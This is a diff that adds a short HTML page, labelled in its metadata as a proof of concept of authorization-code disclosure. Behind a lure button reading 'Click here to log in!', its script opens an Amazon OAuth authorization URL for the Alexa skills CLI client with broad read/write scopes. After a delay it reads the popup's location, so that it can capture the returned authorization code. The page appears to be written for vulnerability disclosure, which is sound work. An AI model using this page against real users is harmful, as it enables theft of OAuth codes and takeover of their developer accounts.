@@ -1,0 +1,22 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+
+  <title>My Cool App</title>
+  <meta name="description" content="PoC of AuthCode Disclosire">
+  <meta name="author" content="godwinv">
+  <script>
+    function runAttack(){
+      var myWindow = window.open("https://www.amazon.com/ap/oa?response_type=code&client_id=amzn1.application-oa2-client.aad322b5faab44b980c8f87f94fbac56&state=Ask-SkillModel-ReadWrite&scope=alexa%3A%3Aask%3Askills%3Areadwrite%20alexa%3A%3Aask%3Amodels%3Areadwrite%20alexa%3A%3Aask%3Askills%3Atest%20alexa%3A%3Aask%3Acatalogs%3Aread%20alexa%3A%3Aask%3Acatalogs%3Areadwrite&redirect_uri=https%3A%2F%2Fs3.amazonaws.com%2Fask-cli%2Fresponse_parser.html");
+      setTimeout(function () {
+        console.log(myWindow.location)
+    }, 20000);
+      
+    }
+  </script>
+</head>
+<body>
+<button onclick="runAttack()"> Click here to log in!</button>
+</body>
+</html>
